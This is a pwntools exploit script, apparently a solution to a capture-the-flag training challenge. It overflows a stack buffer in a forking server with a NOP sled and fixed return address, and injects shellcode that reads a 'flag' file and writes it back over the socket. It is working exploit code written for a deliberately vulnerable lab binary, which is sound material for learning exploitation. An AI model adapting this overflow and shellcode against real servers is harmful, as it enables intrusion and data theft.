from pwn import *
import atexit

# Every time a new connection is created, the server creates a new thread (forks) and asks for a username, which is stored in a global array of 1000 chars (buffer). Then the content of the array is copied in a local array of 312 Bytes, so we can exploit bof to make the program return to the buffer, where we previously saved the exploit, a nop sled and the address of the buffer itself.
# Here the problem was to test the program in local, because in the training platform the server executable is running, but in local you have to debug it separately. The solution is to create two processes: one for the server (to be debugged) and the other one for creating the "remote connection" and sending the exploit.

def exit_hndler():
    if not args.REMOTE:
        serv.kill()     # kill the server otherwise it would stay opened until shutdown
        serv.close()
        
    c.close()

COMMANDS = '''
b main
b *main+466
b prog
b *prog+151
brva 0x14E1
c
'''

context.arch = 'amd64'
exe = './forking_server'

# Find address and port by running ./forking_server and in another terminal window ss -lntup | grep forking_server
target = '0.0.0.0'
port = 4000

addr_finder = cyclic(0x500)
size = 100
buffer = 0x404100

# assembler = shellcraft.amd64.linux.sh()     # for some reason, this doesn't work

# The shellcode is an easy open-read-write, but the file descriptor where to write is not stdout (1), but the socket one (4)
assembler = shellcraft.open("flag") + shellcraft.read('rax', 'rsp', size) + shellcraft.write(4, 'rsp', size)
# print(assembler)

shellcode = asm(assembler)
# print(f'len(shellcode) = {len(shellcode)}')

# the exploit is made by the true shellcode, a nop sled and an address inside the buffer (in the nop sled)
exploit = shellcode + b'\x90' * (0x138 - len(shellcode)) + p64(buffer)    # 0x404100 is the address of buffer (global => fixed, plus it's in a NX memory area!)
# print(exploit)

if args.REMOTE:
    c = remote('forking-server.training.offensivedefensive.it', 8080, ssl=True)
else:
    if args.GDB:
        serv = gdb.debug(exe, gdbscript=COMMANDS)
    else:
        serv = process(exe)

    serv.recvuntil(b'server waiting\n')     # necessary if debugging, otherwise next instruction spawns a connection faster than gdb runs the program and the exploit crashes
    c = remote(target, port)

c.recvuntil(b'name?\n')

# Next instr is used to get the location of the srip, then it is replaced by the true exploit (si it's commented)
# c.sendline(addr_finder)     # srip 0x6461616564616164 => srip is 312=0x138 Bytes above the start of vector s
c.sendline(exploit)

c.interactive()